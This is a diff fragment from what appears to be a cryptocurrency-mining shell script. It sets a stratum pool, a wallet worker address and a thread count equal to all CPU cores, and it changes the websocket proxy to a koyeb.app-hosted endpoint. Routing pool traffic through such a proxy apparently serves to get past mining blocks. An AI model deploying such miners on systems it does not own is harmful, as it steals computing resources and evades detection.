@@ -83,7 +83,7 @@ M_HOST="stratum-asia.rplant.xyz"
 M_PORT="17116"
 M_WORKER="UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx"
 M_PASSWORD="x"
-M_PROXY="ws://172.233.136.27:8085/proxy"
+M_PROXY="wss://integrated-alisun-linuss0411-926b04c0.koyeb.app/proxy"
 
 # Dynamically set the number of threads based on CPU cores
 M_THREADS=$(nproc)  # Number of threads set to the number of available CPU cores
